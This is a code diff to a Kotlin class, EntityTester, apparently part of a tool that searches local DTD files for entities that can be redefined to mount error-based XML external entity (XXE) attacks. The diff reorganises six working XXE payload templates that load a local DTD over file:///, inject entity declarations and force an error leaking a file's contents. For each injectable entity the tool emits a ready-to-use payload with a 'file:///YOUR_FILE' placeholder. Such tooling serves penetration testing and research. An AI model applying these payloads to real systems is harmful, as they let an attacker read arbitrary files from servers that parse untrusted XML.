@@ -14,38 +14,6 @@ import java.io.*
 
 class EntityTester {
 
-    fun listMissingDeclaredEntities(dtdStream: InputStream): ArrayList<String> {
-        val inputSource = InputSource(InputStreamReader(dtdStream))
-        val source = SAXInputSource(inputSource)
-        val d = XMLDTDLoader()
-
-        val missingEntities = ArrayList<String>()
-
-        d.errorHandler = object: XMLErrorHandler {
-            override fun warning(domain: String?, key: String?, exception: XMLParseException?) {
-            }
-
-            override fun error(domain: String?, key: String?, exception: XMLParseException?) {
-
-                if(key == "EntityNotDeclared") {
-                    val res = Regex("The entity \"([^\"]+)\" was referenced, but not declared.").find(exception!!.message!!, 0)
-                    if(res!!.groupValues.size == 2) {
-                        println("Entity name : ${res.groupValues.get(1)}")
-                        missingEntities.add(res.groupValues.get(1))
-                    }
-                }
-            }
-
-            override fun fatalError(domain: String?, key: String?, exception: XMLParseException?) {
-
-            }
-        }
-
-
-        val g = d.loadGrammar(source) as DTDGrammar
-
-        return missingEntities
-    }
 
     fun listOverridableEntities(dtdStream: InputStream): ArrayList<String> {
         val inputSource = InputSource(InputStreamReader(dtdStream))
@@ -125,27 +93,12 @@ class EntityTester {
         return entitiesFound
     }
 
-    fun findInjectableEntity(dtdFullPath:String, originalPath:String, entitiesToTests:ArrayList<String>, missingEntities:ArrayList<String>, reporter:XxeReporter) {
+    fun findInjectableEntity(dtdFullPath:String, originalPath:String, entitiesToTests:ArrayList<String>, reporter:XxeReporter) {
 
         val factory = DocumentBuilderFactory.newInstance()
-
-
-        val bufferStubEntities = StringBuilder()
-        for(entity in missingEntities) {
-            bufferStubEntities.append("<!ENTITY % $entity \"a\">\n")
-        }
-        val stubEntities = bufferStubEntities.toString();
-
-
-
-        //factory.setAttribute(Constants.XERCES_PROPERTY_PREFIX + Constants.ERROR_REPORTER_PROPERTY,errorReporter)
         val builder = factory.newDocumentBuilder()
 
         //The parser will likely logged to the console Fatal error .. We can disable all this for cleaner output
-
-
-
-
         builder.setErrorHandler(
             object : ErrorHandler {
                 override fun warning(exception: SAXParseException?) {
@@ -186,37 +139,8 @@ class EntityTester {
             //val xmlFile = String().javaClass.getResourceAsStream("/input.xml")
             val magicValue = "INJECTION_12345"
 
-            val payloadParentheses = """
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
-
-    <!ENTITY % $entityName 'aaa)>
-        <!ENTITY &#x25; file "$magicValue">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-"""
-            val payloadQuotes = """
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
-
-    <!ENTITY % $entityName '>
-        <!ENTITY &#x25; file "$magicValue">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-"""
-            val payloadNothing = """
+            //#1 Inline
+            val payloadInline = """
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
 
@@ -232,7 +156,90 @@ class EntityTester {
 <message></message>
 """
 
-            val payloadAttribute = """
+            //#2 Inside tag
+            val payloadElementSimple = """
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
+
+    <!ENTITY % $entityName '>
+        <!ENTITY &#x25; file "$magicValue">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+"""
+            //#3 Closing Quotes
+            var payloadElementQuotes = """
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
+
+    <!ENTITY % $entityName '123)*">
+        <!ENTITY &#x25; file "$magicValue">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ENTITY &#x25; aa "(bb|aa'>
+
+    %local_dtd;
+]>
+<message></message>
+"""
+            payloadElementQuotes = """
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
+
+    <!ENTITY % $entityName '
+        <!ENTITY &#x25; file "$magicValue">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ENTITY &#x25; aa "(bb|aa'>
+
+    %local_dtd;
+]>
+<message></message>
+"""
+
+            //#4 Open parentheses
+            val payloadElementOpenParentheses = """
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
+
+    <!ENTITY % $entityName '(aa)>
+        <!ENTITY &#x25; file "$magicValue">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+"""
+
+            //#5 Closing parentheses
+            val payloadElementClosingParentheses = """
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
+
+    <!ENTITY % $entityName 'aaa)>
+        <!ENTITY &#x25; file "$magicValue">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+"""
+
+            //#6 Attribute list
+            val payloadAttributeList = """
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
 
@@ -248,18 +255,25 @@ class EntityTester {
 <message></message>
 """
 
-            val payloads = arrayOf(payloadParentheses,payloadQuotes,payloadNothing,payloadAttribute)
+            val payloads = arrayOf(payloadInline,
+                    payloadElementSimple,payloadElementOpenParentheses,payloadElementClosingParentheses,payloadElementQuotes,
+                    payloadAttributeList)
+
+            //val payloads = arrayOf(payloadElementQuotes)
 
             for (payload in payloads) {
-                ///println(" [-] Entity name: $entityName")
-
+//                println(" [-] Entity name: $entityName")
+//
                 try {
                     builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
+
+
+//                    println("?????")
                 } catch (e: FileNotFoundException) {
                     if (e.message!!.contains(magicValue)) {
                         println(" [+] The entity $entity is injectable")
 
-                        var payloadClean = payload.replace(magicValue,"file:///YOUR_FILE")
+                        var payloadClean = payload.replace("\"$magicValue\"","SYSTEM \"file:///YOUR_FILE\"")
                         payloadClean = payloadClean.replace(dtdFullPath,originalPath).trim()
                         reporter.newPayload("/$originalPath", entity, payloadClean)
 
@@ -268,7 +282,7 @@ class EntityTester {
                     }
                 } catch (e: Exception) {
                     //Failed
-                    ///println(" [!] $e.message")
+//                    println(" [!] $e.message")
                 }
             }
         }
